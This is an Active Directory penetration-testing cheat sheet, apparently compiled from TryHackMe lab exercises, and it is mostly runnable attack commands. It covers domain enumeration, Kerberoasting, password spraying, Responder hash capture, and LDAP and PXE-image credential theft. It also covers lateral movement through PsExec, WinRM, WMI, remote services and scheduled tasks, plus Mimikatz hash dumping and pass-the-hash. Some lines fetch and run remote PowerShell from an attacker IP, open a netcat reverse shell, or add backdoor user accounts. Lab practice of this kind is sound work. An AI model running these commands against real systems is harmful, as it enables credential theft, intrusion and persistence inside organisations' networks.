# Active Directory Penetration Testing Guide

This document provides commands and techniques for Active Directory enumeration,
exploitation, and lateral movement.

---

## 1. Enumeration Techniques

### Basic Command Line Enumeration (net commands)

```bash
# List all domain users
net user /domain

# Get specific user details
net user <username> /domain

# List all domain groups
net group /domain

# Get specific group details
net group "<domain group name>" /domain

# Get domain password policy
net account /domain
```

### PowerShell AD Module Commands

```bash
# Get user information (requires AD module)
Get-ADUser -Identity <username> -Server <Domain controller> -Properties *
# Filter users: -Filter 'Name -like "dawid"'
# Table view: | Format-Table Name,SamAccountName -A

# Get group information
Get-ADGroup -Identity Administrators -Server za.tryhackme.com

# Get group members
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com

# Search for recently changed objects
Get-ADObject -filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com

# Check for account lockouts
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com

# Get domain information
Get-ADDomain -Server za.tryhackme.com
```

### User Account Management

```powershell
# Change user password
Set-ADAccountPassword <user> -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose

# Force password change at next login
Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose

# Change specific user's password
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```

### Advanced Enumeration Tools

#### BloodHound / SharpHound

```bash
# Using BloodHound Python from Linux
bloodhound-python -d <domain> -u <user> -p <password> -ns $IP -c all
bloodhound-python -d <domain> -u <user> -p <password> -ns $IP -gc <hostname> -c all

# Using SharpHound from Windows
Sharphound.exe --CollectionMethods all --Domain za.tryhackme.com --ExcludeDCs

# PowerShell execution of SharpHound
IEX (New-Object System.Net.WebClient).DownloadString('http://10.50.54.101/SharpHound.ps1')
Invoke-Bloodhound -CollectionMethod all
```

#### LDAP Enumeration

```bash
# LDAP domain dump
ldapdomaindump 192.168.0.53 -u 'whirley\userb' -p 'Password1234!'

# PlumHound for reporting
ipython3 PlumHound.py -x tasks/default.tasks -p '<neo4j password>'
```

#### PingCastle

```powershell
# Active Directory security assessment
.\PingCastle.exe
```

#### Impacket Tools

```bash
# Find and request service principal names (Kerberoasting)
impacket-GetUserSPNs <domain>/<user>:<password> -request

# Find users with pre-authentication disabled (ASREPRoasting)
impacket-GetNPUser <domain>/<user>:<password>

# List domain users
impacket-GetADUsers <domain>/<user>:<password> -all

# Dump credentials with admin access
secretsdump.py <domain>/administrator:'<password>'@$IP
```

---

## 2. Initial Access Techniques

### Password Spraying

```bash
# Using custom script
python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com
```

### Authentication Relay (Responder)

```bash
# Start Responder to capture hashes
responder -I <interface>

# Crack captured hashes
hashcat capture.hash passwords

# Trigger from victim machine with:
# \\<Attack IP> or net use \\<AttackIP>
```

### LDAP Credential Capture

```bash
# Setup LDAP server
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
sudo systemctl start slapd

# Create LDIF file to downgrade auth security
cat olcSaslSecProps.ldif
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

# Apply changes
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif

# Verify PLAIN auth is enabled
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

# Capture authentication attempts
sudo tcpdump -SX -i breachad tcp port 389
```

### Microsoft Deployment Toolkit Exploitation

```bash
# Get boot configuration data
tftp -i <MDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd

# Extract WIM path
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile

# Download WIM file
tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim

# Extract credentials
Get-FindCredentials -WimFile .\pxeboot.wim
```

---

## 3. Lateral Movement Techniques

### Test Credential Access

```bash
# Verify credentials (Kerberos auth)
dir \\<domain.name>\SYSVOL

# Verify credentials (NTLM auth)
dir \\<DC IP>\SYSVOL

# Run command as domain user
runas /netonly /user:<domain>\<user> cmd.exe
```

### Remote Process Execution

#### PSExec

```bash
# Remote command execution (requires SMB 445/TCP and Administrator access)
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

#### WinRM/PowerShell Remoting

```bash
# Using WinRS (requires 5985/TCP or 5986/TCP)
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

# With Kerberos ticket
winrs.exe -r:target cmd

# PowerShell remoting
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}

# Using Evil-WinRM
evil-winrm -i $IP -u 'Administrator' -p password cmd.exe
```

#### Remote Service Creation

```bash
# Create and manage services remotely (requires ports 135, 445, 139)
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

#### Remote Scheduled Tasks

```bash
# Create remote task
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00

# Run task
schtasks /s TARGET /run /TN "THMtask1"

# Delete task
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

### WMI-Based Techniques

#### WMI Authentication Setup

```powershell
# Create credential object for authentication
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

# Create WMI/CIM session with DCOM protocol
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

#### Remote Command Execution via WMI

```powershell
# Execute a command remotely (requires ports 135/TCP, 49152-65535/TCP)
# Required group: Administrators
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command }

# Alternative method using command prompt
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

#### Remote Service Management via WMI

```powershell
# Create a new service remotely
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
    Name = "THMService2";
    DisplayName = "THMService2";
    PathName = "net user munra2 Pass123 /add"; # Your payload
    ServiceType = [byte]::Parse("16"); # Win32OwnProcess: Start service in a new process
    StartMode = "Manual"
}

# Get reference to the service
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

# Start the service
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop and delete the service when finished
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

#### Software Installation via WMI

```powershell
# Install MSI package remotely using PowerShell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
    PackageLocation = "C:\Windows\myinstaller.msi";
    Options = "";
    AllUsers = $false
}

# Install MSI package remotely using WMIC
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

### Pass-the-Hash (NTLM) Authentication

#### Extract Hashes

```bash
# Using Mimikatz to dump local SAM database
privilege::debug   
token::elevate    # Get system privileges
lsadump::sam

# Extract credentials from LSASS memory
privilege::debug
token::elevate
sekurlsa::msv
```

#### Use NTLM Hashes for Authentication

```bash
# Need to revert token before using PTH
token::revert 
# Use NTLM hash to execute commands
sekurlsa::pth /user:<user.name> /domain:<domain.full.com> /ntlm:<hash> /run:"c:\my command"

# Example with specific command
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.67.205"

# RDP access using hash
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

# Command execution using Impacket's PsExec
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

# PowerShell remoting with hash
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

---

## 4. Miscellaneous Techniques

### Config File Analysis

```bash
# Example: Analyze McAfee database for credentials
sqlitebrowser ma.db
```

### Local Admin Access Check

```powershell
# Identify machines where your account has admin access
Find-LocalAdminAccess
```
